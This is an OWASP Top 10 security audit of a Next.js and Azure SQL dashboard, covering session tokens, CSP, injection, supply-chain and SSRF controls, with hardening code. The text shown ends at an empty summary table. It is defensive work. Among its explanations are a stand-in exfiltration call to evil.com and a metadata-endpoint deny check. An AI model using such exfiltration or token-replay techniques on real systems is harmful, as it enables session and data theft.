# OWASP Top 10 Security Audit — ATTG Analytics Dashboard

**Audit Date:** June 5, 2026 (last updated)  
**Scope:** Full-stack application (Next.js 15 + Azure SQL + IIS/Azure App Service)  
**Standard:** OWASP Top 10 Web Application Security Risks (2021)  
**Status:** Comprehensive review — mitigations verified against current codebase

---

## Architecture Summary

| Component | Technology |
|---|---|
| Frontend | Next.js 15 (App Router), React 18, TypeScript 5.x |
| Auth Provider | Auth.js v5 + Microsoft Entra ID (OAuth 2.0 / OIDC) |
| Session Transport | AES-256-GCM encrypted + HMAC-SHA256 signed token in `sessionStorage`, sent as `Bearer` header |
| Server-Side Session ID | `attg_sid` cookie (HMAC-signed userId, ~80 bytes, path `/`) for server component auth |
| Auth.js Cookie Scope | `authjs.session-token` scoped to `/api/auth` (never sent on page requests) |
| Token TTL | 15 minutes, silent refresh every 10 minutes |
| Database | Azure SQL (mssql driver, parameterized queries, explicit type bindings) |
| Hosting | IIS (IISNode) + Azure App Service |
| WAF | Azure WAF (causes cookie interference → motivates sessionStorage approach) |
| Rate Limiting | Per-process in-memory sliding window (10 req/min token endpoint, 60 req/min default) |
| Security Headers | CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy |

---

## A01:2021 — Broken Access Control

### Vulnerability Risk & Relevance

In this stack, access control failures manifest as:
- **Vertical privilege escalation**: A `viewer` user crafts requests to admin-only endpoints (e.g., `POST /api/admin/users`).
- **Horizontal data leakage**: A user scoped to Application A reads metrics for Application B by manipulating route parameters (e.g., `/api/metrics/[appId]`).
- **Token theft via XSS**: Since the Bearer token resides in `sessionStorage`, any XSS on the page grants the attacker the victim's full API access.

### Session Storage Context

`sessionStorage` is readable by all JavaScript executing in the same tab origin. The token stored at `attg_session_token` is encrypted (AES-256-GCM), so an attacker cannot decode claims — but they can **replay** the opaque token to impersonate the user for up to 15 minutes (the token TTL). The fetch interceptor is now **frozen** via `Object.defineProperty` with `writable: false, configurable: false`, preventing XSS or supply-chain attacks from replacing it. A descriptor-check guard handles React Strict Mode double-mount and HMR without throwing.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| Deny-by-default middleware (Bearer required for `/api/*`) | ✅ | `middleware.ts` (plain `NextRequest` function, not wrapped with `auth()`) |
| Dev auth routes blocked in production | ✅ | `middleware.ts` |
| Per-route guards (`requireActive`, `requireAdministrator`) | ✅ | `lib/auth/guards.ts` |
| Application-scope enforcement (`assertApplicationScope`) | ✅ | `lib/auth/authorization.ts` |
| Pipeline-specific scope checks | ✅ | `lib/auth/pipelineAuthorization.ts` |
| Dashboard scope filtering | ✅ | `lib/auth/dashboardScope.ts` |
| `ACCESS_DENIED` events logged with IP/UA/path | ✅ | `lib/api/security-audit.ts` |

### Remaining Gaps & Hardening

**1. No automated route-coverage enforcement test:**

If a developer adds a new API route and forgets a guard, it's open (middleware only checks for Bearer presence, not authorization). Add a CI test that verifies every registered API route returns 403/401 for unauthenticated/unauthorized callers:

```typescript
// tests/integration/api-route-coverage.test.ts
import { glob } from "fast-glob";

const apiRoutes = await glob("src/frontend/app/api/**/route.ts", { ignore: ["**/auth/**"] });

for (const routeFile of apiRoutes) {
  test(`${routeFile} rejects requests without valid Bearer`, async () => {
    // Import and invoke each route handler with no Authorization header
    // Assert 401 response
  });
}
```

**2. Horizontal access control relies on per-endpoint `assertApplicationScope` calls:**

There is no middleware-level enforcement of application scoping. A single forgotten `assertApplicationScope()` call exposes cross-tenant data. Consider a centralized middleware that extracts `appId` from path parameters and validates scope before the route handler executes.

**3. Token replay window (15 minutes):**

If a token is stolen, the attacker has a 15-minute window. This is acceptable for this risk profile, but for highly sensitive operations (e.g., user deactivation, role changes), consider requiring a fresh token or re-authentication challenge.

---

## A02:2021 — Cryptographic Failures

### Vulnerability Risk & Relevance

For this stack, cryptographic failures apply to:
- **Session token confidentiality**: Can an attacker who obtains the raw token from `sessionStorage` decode user claims?
- **Token forgery**: Can an attacker craft a valid token without the signing secret?
- **Secret compromise blast radius**: If `SESSION_TOKEN_SECRET` leaks, how many sessions are affected and how fast can you rotate?
- **Wire encryption**: Is SQL traffic encrypted between the App Service and Azure SQL?

### Session Storage Context

The token in `sessionStorage` is **encrypted with AES-256-GCM** (not merely signed). An attacker who reads the raw value via XSS obtains an opaque blob — they can replay it as a Bearer token for up to 15 minutes, but they **cannot** decode userId, role, or application scopes. This is a significant improvement over plaintext-signed tokens: it eliminates information disclosure while limiting the utility of the stolen credential to the remaining TTL.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| AES-256-GCM encryption of token payload | ✅ | `lib/auth/session-token.ts` (encrypt/decrypt functions) |
| HMAC-SHA256 signature over ciphertext (Encrypt-then-MAC) | ✅ | `lib/auth/session-token.ts` (sign/verify) |
| Timing-safe signature comparison (`timingSafeEqual`) | ✅ | `lib/auth/session-token.ts` |
| Domain-separated key derivation (`aes-enc:` prefix + SHA-256) | ✅ | `lib/auth/session-token.ts` |
| Zero-downtime secret rotation (`SESSION_TOKEN_SECRET_PREVIOUS`) | ✅ | `lib/auth/session-token.ts` (getVerificationSecrets) |
| Minimum secret length enforcement (≥32 chars) | ✅ | `lib/auth/session-token.ts` (getPrimarySecret) |
| 96-bit random IV per token (no IV reuse) | ✅ | `lib/auth/session-token.ts` |
| Runtime guard: `assertProductionEncryption()` rejects `SQL_ENCRYPT=false` | ✅ | `lib/db/pool.ts` |
| `.gitignore` excludes all `.env.local` / `.env.*.local` files | ✅ | `.gitignore` |

### Remaining Gaps & Hardening

**1. ~~No runtime guard enforcing `SQL_ENCRYPT=true` in production~~ ✅ RESOLVED:**

The runtime guard is now implemented in `lib/db/pool.ts` as `assertProductionEncryption()`. It throws at startup if `SQL_ENCRYPT=false` in production, preventing unencrypted SQL connections.

> ⚠️ **Residual risk:** The committed `.env.production` file contains `SQL_ENCRYPT=false` as a placeholder. While the runtime guard catches this, it means production will **fail to start** unless Azure App Service application settings explicitly override with `SQL_ENCRYPT=true`. Document this requirement in deployment runbooks. Consider changing the `.env.production` default to `SQL_ENCRYPT=true` to fail-open rather than fail-closed on missing overrides.

**2. Encryption key and HMAC key are derived from the same root secret:**

While `deriveEncryptionKey` uses a domain separator (`aes-enc:`), both operations rely on `SESSION_TOKEN_SECRET`. If the secret is compromised, both confidentiality and integrity are lost simultaneously. For defense-in-depth, consider deriving the HMAC key with a separate domain separator:

```typescript
function deriveHmacKey(secret: string): string {
  return createHash("sha256").update(`hmac-sign:${secret}`).digest("base64url");
}
```

**3. No key length enforcement beyond "≥32 characters":**

Secrets should ideally be generated with `openssl rand -base64 48` (64 characters, 48 bytes of entropy). Document minimum entropy requirements in deployment runbooks.

**4. Secret rotation procedure needs operational documentation:**

The code supports rotation (`SESSION_TOKEN_SECRET_PREVIOUS`), but there's no documented procedure for when/how to rotate. Recommendation: rotate quarterly, or immediately upon any suspected compromise. After one full TTL (15 minutes) past rotation, remove the previous secret.

---

## A03:2021 — Injection

### Vulnerability Risk & Relevance

For this stack, injection manifests as:
- **SQL Injection**: Malicious input in numerator payloads, filter rules, or user management forms reaches Azure SQL.
- **NoSQL/Object Injection**: Prototype pollution in parsed JSON payloads escalates to `__proto__` overwrites.
- **Header Injection**: Malformed values in `x-forwarded-for` or `x-request-id` propagated into log output enable log injection/forging.
- **Command Injection**: If any server-side code shells out to system commands (not observed in this codebase).

### Session Storage Context

No direct injection risk from sessionStorage — the token is verified and decrypted server-side before user context is established. The userId extracted from the decrypted token is used as a parameterized SQL value (never interpolated). An attacker cannot inject SQL via the token because the token is AES-256-GCM encrypted; tampering invalidates the GCM auth tag.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| `assertParameterizedSql()` guard rejects `${}` in SQL strings | ✅ | `lib/db/sql-client.ts` |
| All queries use `request.input(name, value)` parameterization | ✅ | `lib/db/runtime-sql-client.ts` |
| Prototype pollution rejection (`__proto__`, `prototype`, `constructor`) | ✅ | Numerator ingestion route |
| Zod schema validation on all user-facing inputs | ✅ | API routes (user mgmt, filters, numerator) |
| Username regex: alphanumeric + `_`/`-` only | ✅ | Zod user schema |
| Email: RFC 5321 format validation | ✅ | Zod user schema |

### Remaining Gaps & Hardening

**1. Add explicit SQL type declarations to prevent type coercion:**

The current `request.input(name, value)` relies on mssql's auto-type inference. For defense-in-depth, pin types explicitly in data-access adapters:

```typescript
import sql from "mssql";

// In repository/adapter layer:
request.input("userId", sql.UniqueIdentifier, userId);
request.input("email", sql.NVarChar(255), email);
request.input("isActive", sql.Bit, isActive ? 1 : 0);
request.input("count", sql.Int, count);
```

**2. ~~Log injection via `x-request-id` header~~ ✅ RESOLVED:**

The `getOrCreateRequestId` function has been extracted to a shared utility (`lib/api/request-id.ts`) that strips ASCII control characters (0x00–0x1F, 0x7F) and enforces a 128-character maximum length. Both consumers (`middleware.ts` and `app/api/auth/[...nextauth]/route.ts`) now import from this single source, eliminating drift risk.

**3. Payload size enforcement:**

Large JSON payloads to the numerator ingestion endpoint can cause memory pressure. Add a hard size cap at the route level:

```typescript
const MAX_PAYLOAD_BYTES = 1_048_576; // 1 MB
const contentLength = parseInt(request.headers.get("content-length") ?? "0", 10);
if (contentLength > MAX_PAYLOAD_BYTES) {
  return Response.json({ error: "PAYLOAD_TOO_LARGE" }, { status: 413 });
}
```

---

## A04:2021 — Insecure Design

### Vulnerability Risk & Relevance

Insecure design in this stack relates to architectural decisions that create systemic vulnerability regardless of implementation quality:
- **Dev bypass as a feature**: The existence of `DEV_SESSION_USER_ID` and `ENABLE_DEV_BYPASS` in the codebase is an attack surface if environment misconfiguration occurs.
- **Session state in client-controlled storage**: Choosing `sessionStorage` (tab-scoped, JS-accessible) over `httpOnly` cookies is a deliberate trade-off driven by WAF interference — but it permanently exposes the session token to any same-origin JavaScript.
- **Token-based claims caching**: Role and application scopes are baked into the token at issuance. Changes to user state during the TTL window are not reflected.

### Session Storage Context

`sessionStorage` is tab-scoped — closed tabs lose their token. This naturally limits session duration. The 15-minute TTL with 10-minute refresh means:
- If a user is deactivated, the server returns null on the next refresh attempt (within 10 min), and `clearStoredSession()` is called.
- If a user's role is downgraded, the stale token retains the old role for at most 15 minutes. The server-side `getSessionUser()` re-resolves role from the database on every request (via `resolveFromBearerToken`), so the **effective** access reflects the current DB state in real-time.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| Production startup guard: rejects `ENABLE_DEV_BYPASS=true` | ✅ | `lib/security/runtime-security.ts` |
| Production startup guard: rejects `DEV_SESSION_USER_ID` presence | ✅ | `lib/security/runtime-security.ts` |
| Middleware blocks `/api/auth/dev-*` in production (404) | ✅ | `middleware.ts` lines 59–69 |
| 15-minute token TTL (reduced from original 24h) | ✅ | `lib/auth/session-token.ts` |
| Silent refresh every 10 minutes | ✅ | `SessionProvider.tsx` (useEffect interval) |
| Server-side role re-verification on every API request | ✅ | `lib/auth/session.ts` (resolveFromBearerToken) |
| Session cleared on refresh failure (user deactivated) | ✅ | `SessionProvider.tsx` (clearStoredSession) |

### Remaining Gaps & Hardening

**1. No server-side token revocation (blocklist):**

There is no mechanism to immediately invalidate a specific user's token before its 15-minute TTL expires. If an admin detects a compromised account, the fastest lockout is to deactivate the user in the DB — the next API call's `assertActiveSession()` will reject it. But any in-flight requests within the same tick succeed.

For immediate revocation, add a lightweight blocklist (Azure Cache for Redis or a DB table):

```typescript
// src/frontend/lib/auth/token-revocation.ts
const REVOKED_TOKENS_TABLE = "app.RevokedTokens";

export async function revokeAllTokensForUser(userId: string): Promise<void> {
  await executeParameterizedQuery(
    `INSERT INTO ${REVOKED_TOKENS_TABLE} (UserId, RevokedAt, ExpiresAt)
     VALUES (@userId, SYSUTCDATETIME(), DATEADD(MINUTE, 15, SYSUTCDATETIME()))`,
    { userId }
  );
}

export async function isTokenRevoked(userId: string, issuedAt: number): Promise<boolean> {
  const result = await executeParameterizedQuery(
    `SELECT 1 FROM ${REVOKED_TOKENS_TABLE}
     WHERE UserId = @userId AND RevokedAt > @issuedAt AND ExpiresAt > SYSUTCDATETIME()`,
    { userId, issuedAt: new Date(issuedAt * 1000) }
  );
  return result.recordset.length > 0;
}
```

**2. `dev-bypass.ts` still exists in the production build:**

While runtime guards prevent execution, the code is bundled into production artifacts. Consider using `process.env.NODE_ENV === "development"` as a tree-shaking signal with dead code elimination, or move dev-bypass logic into a separate entry point excluded from production builds.

**3. No re-authentication challenge for destructive admin operations:**

Operations like "delete user", "change user role", or "trigger full pipeline reset" should require a fresh token or step-up authentication to mitigate stolen-token abuse.

---

## A05:2021 — Security Misconfiguration

### Vulnerability Risk & Relevance

Security misconfiguration in this stack means:
- **Missing HTTP security headers** allow XSS (which directly compromises `sessionStorage` tokens), clickjacking, and MIME-sniffing attacks.
- **IIS error pages** exposing stack traces to end users reveals internal paths, dependency versions, and logic.
- **Distributed rate limiting gaps**: An attacker who identifies the multi-instance deployment can round-robin requests across instances to bypass per-process limits.

### Session Storage Context

The **Content-Security-Policy** is the single most important defense for `sessionStorage`-based sessions. The nonce-based CSP (`script-src 'nonce-...' 'strict-dynamic'`) provides two layers of protection:
1. **Inline script injection is blocked** — injected `<script>` tags without the per-request nonce are refused by the browser.
2. **`connect-src 'self'`** blocks exfiltration to external origins — even if an attacker finds an execution path, `fetch("https://evil.com/...")` is blocked.

The residual risk: an attacker who achieves script execution (e.g., via a nonced script's eval path or a trusted dependency) can still make same-origin API calls using the token from `sessionStorage`.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| **Nonce-based CSP** (`script-src 'nonce-...' 'strict-dynamic'`) | ✅ | `middleware.ts` (per-request nonce generation + CSP header) |
| CSP `connect-src 'self'` blocks token exfiltration to external origins | ✅ | `middleware.ts` |
| CSP `object-src 'none'` blocks plugin-based attack vectors | ✅ | `middleware.ts` |
| CSP `worker-src 'self'` restricts Service Workers to same origin | ✅ | `middleware.ts` |
| CSP `child-src 'self'` restricts child frames/workers | ✅ | `middleware.ts` |
| CSP `manifest-src 'self'` restricts web app manifests | ✅ | `middleware.ts` |
| CSP `style-src-elem` nonce-gated (blocks injected `<style>` elements) | ✅ | `middleware.ts` |
| CSP `style-src-attr 'unsafe-inline'` (allows React `style={}` props) | ✅ | `middleware.ts` |
| CSP nonce propagated to theme-init script | ✅ | `layout.tsx` (`<script nonce={nonce}>`) |
| `'strict-dynamic'` trusts scripts loaded by nonced bootstrap | ✅ | `middleware.ts` (allows Next.js chunk loading) |
| ESLint `react/no-danger: error` (blocks new `dangerouslySetInnerHTML`) | ✅ | `eslint.config.js` (layout.tsx allowlisted) |
| HSTS (max-age=31536000; includeSubDomains) | ✅ | `next.config.ts` |
| X-Frame-Options: DENY | ✅ | `next.config.ts` + `web.config` |
| X-Content-Type-Options: nosniff | ✅ | `next.config.ts` + `web.config` |
| Referrer-Policy: strict-origin-when-cross-origin | ✅ | `next.config.ts` + `web.config` |
| Permissions-Policy (camera/mic/geo disabled) | ✅ | `next.config.ts` + `web.config` |
| X-Powered-By header removed | ✅ | `web.config` (customHeaders remove) |
| `devErrorsEnabled="false"` in IIS | ✅ | `web.config` |
| Per-IP rate limiting on session-token (10/min) | ✅ | `app/api/auth/session-token/route.ts` |
| Per-IP rate limiting with configurable window/max | ✅ | `lib/api/rate-limit.ts` |
| Periodic rate-limit store cleanup (prevents memory leak) | ✅ | `lib/api/rate-limit.ts` |

### Remaining Gaps & Hardening

**1. Rate limiting is per-process (not distributed):**

In an Azure App Service with multiple instances (or after autoscale), an attacker can send `10 × N` requests per minute (where N = instance count). Options:
- **Azure API Management** in front of the App Service with a rate-limit policy
- **Azure WAF rate-limiting rules** (though the WAF already causes cookie issues)
- **Shared Redis counter** via Azure Cache for Redis

**2. No `X-DNS-Prefetch-Control: off` header:**

Browser DNS prefetching of hrefs in the page could leak internal URLs to DNS resolvers. Low risk for this internal-facing app, but easy to add:

```typescript
{ key: "X-DNS-Prefetch-Control", value: "off" },
```

**3. `maxQueryString="16384"` in web.config:**

This is necessary for Entra OAuth code flows, but a 16KB query string is also a vector for URL-based buffer attacks against legacy proxies. Ensure Azure Front Door / WAF is configured to reject requests exceeding this limit before they hit IIS.

---

## A06:2021 — Vulnerable and Outdated Components

### Vulnerability Risk & Relevance

This stack's dependency surface includes:
- **Next.js 15** — actively maintained, but App Router API surface is evolving rapidly.
- **Auth.js v5** — beta-quality historically; authentication libraries are high-value targets for CVEs.
- **mssql** — Node.js SQL Server driver; CVEs in TDS protocol handling or connection pooling are possible.
- **React 18** — stable, low CVE history.
- **Zod** — validation library with minimal attack surface.

The risk is **supply-chain compromise** (malicious package update) or **unpatched known vulnerability** in a transitive dependency.

### Session Storage Context

A compromised dependency (e.g., a malicious `postinstall` script) could inject code that reads `sessionStorage` and exfiltrates tokens. The `globalThis.fetch` interceptor is now **frozen** (`writable: false, configurable: false`) — a supply-chain package cannot replace it at runtime. Combined with `connect-src 'self'` in the CSP, this provides two independent layers against token exfiltration via fetch replacement.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| `package-lock.json` with integrity hashes | ✅ | Root `package-lock.json` |
| Fetch interceptor frozen (`writable: false, configurable: false`) | ✅ | `SessionProvider.tsx` |

### Remaining Gaps & Hardening

**1. No `npm audit` in CI pipeline:**

```yaml
# azure-pipelines.yml — add after npm ci
- script: npm audit --audit-level=high --omit=dev
  displayName: "Security: npm audit (production deps)"
  condition: succeededOrFailed()
```

**2. No automated dependency update mechanism (Dependabot/Renovate):**

Configure GitHub Dependabot or Renovate to auto-create PRs for security patches:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5
    labels: ["dependencies", "security"]
```

**3. `npm ci --ignore-scripts` not enforced in CI:**

Malicious `postinstall` scripts in transitive dependencies can execute arbitrary code during install. Run `npm ci --ignore-scripts` then explicitly invoke trusted build scripts:

```bash
npm ci --ignore-scripts
npx next build  # only trusted script execution
```

**4. No Software Bill of Materials (SBOM) generation:**

For enterprise compliance, generate an SBOM on each release:

```bash
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
```

---

## A07:2021 — Identification and Authentication Failures

### Vulnerability Risk & Relevance

Authentication failures in this stack manifest as:
- **Token farming**: An attacker with a valid Auth.js cookie repeatedly calls `/api/auth/session-token` to generate tokens (e.g., for distributed attacks using different sessions).
- **Login CSRF**: An attacker tricks a victim's browser into calling the token endpoint, acquiring a token for the attacker's session (login CSRF).
- **Dev login accepting arbitrary identifiers**: The dev-login route authenticates any user by identifier without credentials.
- **Session fixation via Auth.js cookie**: An attacker pre-sets an Auth.js session cookie in the victim's browser.

### Session Storage Context

Bearer tokens in `sessionStorage` are **never sent automatically** by the browser — they must be explicitly attached via the fetch interceptor. This eliminates CSRF on all API endpoints (since the browser won't include the token in cross-origin requests). However, the **initial token acquisition** (`POST /api/auth/session-token`) still relies on the Auth.js cookie being sent with `credentials: "same-origin"` — that specific endpoint needs separate CSRF protection.

The current implementation correctly:
- Uses `POST` (not `GET`) to trigger browser Origin header inclusion
- Verifies `Origin` against `AUTH_URL` (blocks cross-origin requests)
- Rate-limits to 10 requests per minute per IP

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| Session-token endpoint is POST-only | ✅ | `app/api/auth/session-token/route.ts` |
| Origin header verification against AUTH_URL | ✅ | `verifyOrigin()` function |
| Rate limiting: 10 req/min per IP | ✅ | `checkRateLimit("session-token:${clientIp}")` |
| CSRF rejection logged as security event | ✅ | `logCsrfRejectedEvent()` |
| Dev login blocked in production (middleware + runtime) | ✅ | `middleware.ts` + `runtime-security.ts` |
| OID binding: SSO identity linked to user record | ✅ | `lib/auth/session.ts` (bindSsoIdentity) |
| Auth.js JWT strategy (no server-side session to fixate) | ✅ | `auth.ts` (strategy: "jwt") |

### Remaining Gaps & Hardening

**1. `verifyOrigin()` falls through permissively in development:**

```typescript
// Current: if !expectedBase && NODE_ENV !== "production" → return true
```

This means any origin is accepted in non-production environments. If a staging environment has `NODE_ENV=development` but is publicly accessible, CSRF protection is disabled. Fix:

```typescript
function verifyOrigin(request: Request): boolean {
  const origin = request.headers.get("Origin");
  const expectedBase = process.env.AUTH_URL?.trim();

  // Require AUTH_URL in all environments except localhost
  if (!expectedBase) {
    const host = request.headers.get("Host") ?? "";
    return host.startsWith("localhost") || host.startsWith("127.0.0.1");
  }

  if (!origin) return false;

  try {
    return origin === new URL(expectedBase).origin;
  } catch {
    return false;
  }
}
```

**2. No account lockout after repeated auth failures:**

The rate limiter prevents rapid-fire requests, but there's no per-user lockout. If an attacker compromises an Auth.js cookie and the user's Entra account is still active, the rate limit (10/min) allows steady token generation. Consider adding per-user throttling:

```typescript
const userRateCheck = checkRateLimit(`session-token:user:${userId}`, { maxRequests: 3, windowMs: 60_000 });
```

**3. No binding between Auth.js session and session token:**

The session-token endpoint doesn't record which Auth.js session ID was used to issue the token. If the Auth.js session is revoked (e.g., Entra sign-out), existing session tokens remain valid for their TTL. This is acceptable given the 15-minute TTL, but for compliance-sensitive environments, consider:
- Storing `session.jti` in the encrypted token
- Checking revocation on each API request (expensive)

---

## A08:2021 — Software and Data Integrity Failures

### Vulnerability Risk & Relevance

Software/data integrity failures in this stack include:
- **Supply-chain attacks**: A compromised npm package executes malicious code during install or at runtime, accessing `sessionStorage` tokens or modifying API responses.
- **Fetch interceptor tampering**: If an attacker (via XSS or supply-chain) can replace `globalThis.fetch` before the interceptor is installed, they can steal tokens from every outgoing request.
- **`dangerouslySetInnerHTML` injection**: If user-controlled data flows into innerHTML, arbitrary script execution occurs.
- **CI/CD pipeline integrity**: If build artifacts are tampered with between CI and deployment, malicious code enters production.

### Session Storage Context

The fetch interceptor reads `sessionStorage.getItem(STORAGE_KEY)` on every API call and attaches it as a Bearer header. The interceptor is now **frozen** with `writable: false, configurable: false` via a descriptor-check guard pattern that safely handles React Strict Mode double-mount and HMR:

```typescript
function installFetchInterceptor(): () => void {
  // If already frozen from a prior mount, skip — no TypeError.
  const descriptor = Object.getOwnPropertyDescriptor(globalThis, "fetch");
  if (descriptor && !descriptor.configurable) {
    return () => {};
  }

  const originalFetch = globalThis.fetch;
  // ... interceptedFetch definition ...

  Object.defineProperty(globalThis, "fetch", {
    value: interceptedFetch,
    writable: false,
    configurable: false,
  });

  return () => {}; // No-op cleanup — interceptor is permanent
}
```

This provides defense-in-depth against CSP header stripping by misconfigured reverse proxies, browser CSP bugs, or future code changes that accidentally relax `connect-src`.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| `globalThis.fetch` interceptor frozen (`writable: false, configurable: false`) | ✅ | `SessionProvider.tsx` (Object.defineProperty + descriptor guard) |
| `dangerouslySetInnerHTML` only used with hardcoded static constant | ✅ | `layout.tsx` (THEME_INIT_SCRIPT) |
| `package-lock.json` pins exact versions with integrity hashes | ✅ | Root lockfile |
| CSP `connect-src 'self'` blocks exfiltration to external origins | ✅ | `next.config.ts` |

### Remaining Gaps & Hardening

**1. `npm ci --ignore-scripts` not enforced in CI:**

A compromised transitive dependency's `postinstall` script can execute arbitrary code on the build agent, potentially injecting backdoors into the build output:

```yaml
# CI pipeline
- script: npm ci --ignore-scripts
  displayName: "Install dependencies (no lifecycle scripts)"

- script: npx next build
  displayName: "Build application (trusted)"
```

**2. No Subresource Integrity (SRI) on self-hosted scripts:**

While no external CDN scripts are loaded, Next.js generates chunk files with content-hashed filenames. If the static file server is compromised, SRI would detect tampering. Next.js doesn't natively support SRI on its own chunks, but for any manually added `<script>` tags, always include `integrity` attributes.

**3. ~~The `THEME_INIT_SCRIPT` in `dangerouslySetInnerHTML` is a maintenance risk~~ ✅ MITIGATED:**

The security comment is now in place in `layout.tsx`:

```typescript
// SECURITY: This constant MUST remain hardcoded with no dynamic content.
// Any variable interpolation here creates a stored XSS vulnerability.
// See SECURITY_AUDIT_OWASP.md A08 for context.
const THEME_INIT_SCRIPT = `...`;
```

**4. ~~Fetch interceptor is NOT frozen — writable/configurable after installation~~ ✅ RESOLVED:**

The `installFetchInterceptor()` now uses `writable: false, configurable: false` with a descriptor-check guard:
- First mount: installs and freezes the interceptor
- React Strict Mode re-mount: detects `!descriptor.configurable`, returns no-op
- HMR: same — skips, no TypeError
- Cleanup on unmount: no-op (interceptor is permanent for the tab lifetime)

This adds defense-in-depth against CSP misconfiguration without breaking the React component lifecycle.

**4. No build artifact integrity verification:**

The deployment pipeline should compute a SHA-256 hash of the `.next` build output and verify it hasn't been modified during transfer to the App Service:

```bash
# In CI, after build:
find .next -type f -exec sha256sum {} \; | sort | sha256sum > .next/BUILD_HASH

# In deployment, verify:
# Compare BUILD_HASH from artifact against the CI-recorded value
```

---

## A09:2021 — Security Logging and Monitoring Failures

### Vulnerability Risk & Relevance

Without adequate security logging:
- **Brute-force attacks** against the token endpoint go undetected.
- **Privilege escalation attempts** (viewer hitting admin endpoints) are invisible.
- **Account takeover** (stolen token reuse) lacks forensic trail.
- **CSRF probes** from attacker-controlled origins leave no evidence for incident response.

In this stack, logs go to stdout/stderr — only useful if connected to a centralized log aggregator (Azure Monitor, Application Insights, or a SIEM).

### Session Storage Context

Because `sessionStorage` tokens are opaque to the server (encrypted), the only way to detect token theft or misuse is through behavioral analysis of server-side logs: unusual IP changes for the same userId, geographically impossible login sequences, or API access patterns inconsistent with the user's role.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| Structured JSON security events (6 event types) | ✅ | `lib/api/security-audit.ts` |
| AUTH_FAILURE logged with IP, UA, path, method, requestId | ✅ | `logAuthFailureEvent()` |
| RATE_LIMIT_HIT logged per endpoint | ✅ | `logRateLimitEvent()` |
| CSRF_REJECTED logged with received origin | ✅ | `logCsrfRejectedEvent()` |
| ACCESS_DENIED logged (middleware rejections) | ✅ | `logAccessDeniedEvent()` |
| PRIVILEGE_ESCALATION_ATTEMPT event type defined | ✅ | `SecurityEventType` union |
| Request logging with sensitive field redaction | ✅ | `lib/api/request-logger.ts` |
| Audit logging for user creation / SSO binding | ✅ | `lib/api/audit-logger.ts` |
| Consistent schema: timestamp, service name, severity | ✅ | All security events |
| Application Insights integration (security event forwarding) | ✅ | `lib/telemetry/app-insights.ts` + `instrumentation.ts` |

### Remaining Gaps & Hardening

**1. ~~No Azure Application Insights integration~~ ✅ RESOLVED:**

Application Insights is now integrated via `lib/telemetry/app-insights.ts`:
- Auto-initialises at server startup via Next.js `instrumentation.ts` hook
- Auto-collects requests, exceptions, performance, and dependencies
- All security events from `logSecurityEvent()` are forwarded as custom events (`Security.AUTH_FAILURE`, `Security.RATE_LIMIT_HIT`, etc.)
- Cloud role tag set to `attg-analytics-dashboard` for filtering
- Graceful no-op when `APPLICATIONINSIGHTS_CONNECTION_STRING` is not set
- Connection string placeholder added to `.env.production` (provide via App Service settings or Key Vault reference)

**2. No alerting on security event thresholds:**

Define Azure Monitor alert rules:
- `AUTH_FAILURE` count > 50 in 5 minutes → P1 alert (credential stuffing)
- `CSRF_REJECTED` count > 10 in 1 minute → P2 alert (active probe)
- `PRIVILEGE_ESCALATION_ATTEMPT` any occurrence → P1 alert (immediate review)
- `RATE_LIMIT_HIT` sustained > 5 minutes → P2 alert (DDoS/abuse)

**3. No correlation between Auth.js session events and application security events:**

Auth.js emits its own sign-in/sign-out events via callbacks. Link these to the application's security audit trail by emitting a corresponding `AUTH_SUCCESS` event in the session-token route on successful token issuance (including the Entra OID and email).

**4. No log retention policy documented:**

For compliance (SOX, internal audit), define retention: 90-day hot storage, 1-year cold archive. Configure in Application Insights workspace settings.

---

## A10:2021 — Server-Side Request Forgery (SSRF)

### Vulnerability Risk & Relevance

SSRF in this stack could manifest if:
- The `ADF_PIPELINE_TRIGGER_ENDPOINT` is controllable or redirect-followable to internal Azure metadata endpoints (`169.254.169.254`).
- Any user-supplied URL is used in server-side HTTP requests (e.g., webhook callbacks, avatar URLs).
- SQL connection strings are constructed from user input (not the case here).

### Session Storage Context

No SSRF risk from sessionStorage. The token is never used to construct outbound URLs. SSRF is orthogonal to session state in this architecture.

### Current Mitigations (✅ Implemented)

| Control | Status | Location |
|---|---|---|
| `assertAllowedOutboundUrl()` validates ADF endpoint at construction | ✅ | `infrastructure/clients/ADFPipelineClient.ts` |
| HTTPS-only enforcement for outbound URLs | ✅ | ADFPipelineClient validation |
| Allowlist of Azure host suffixes (`.azure.com`, `.azure.net`, `.windows.net`, `.azure-api.net`) | ✅ | ADFPipelineClient validation |
| Startup-time validation via `validateRuntimeSecurityConfig()` | ✅ | `lib/security/runtime-security.ts` |
| Comprehensive test coverage (rejects non-HTTPS, non-Azure hosts, FTP, invalid URLs) | ✅ | `ADFPipelineClient.test.ts` |
| No user-supplied URLs used in server-side requests | ✅ | Architecture review |

### Assessment: SSRF Risk is LOW (✅ Adequately Mitigated)

The only outbound HTTP call is to the ADF pipeline trigger endpoint, which is:
1. Sourced from environment variable (not user input)
2. Validated at startup against a strict allowlist
3. Tested for rejection of non-Azure, non-HTTPS URLs

### Hardening (Optional, Defense-in-Depth)

**1. Block Azure Instance Metadata Service (IMDS) explicitly:**

Even though the allowlist approach is strong, add an explicit deny for the metadata endpoint as a failsafe:

```typescript
function assertNotMetadataEndpoint(url: URL): void {
  if (url.hostname === "169.254.169.254" || url.hostname === "metadata.google.internal") {
    throw new Error("SSRF: request to cloud metadata endpoint blocked.");
  }
}
```

**2. Disable redirect following on the ADF HTTP client:**

```typescript
const response = await fetch(endpoint, {
  method: "POST",
  redirect: "error", // Prevent open redirects to internal services
  headers: { "Authorization": `Bearer ${token}` },
  body: JSON.stringify(payload),
});
```

---

## Summary — Current Security Posture

### Implemented Controls (Since Initial Audit)

| # | Control | OWASP Category | Status |
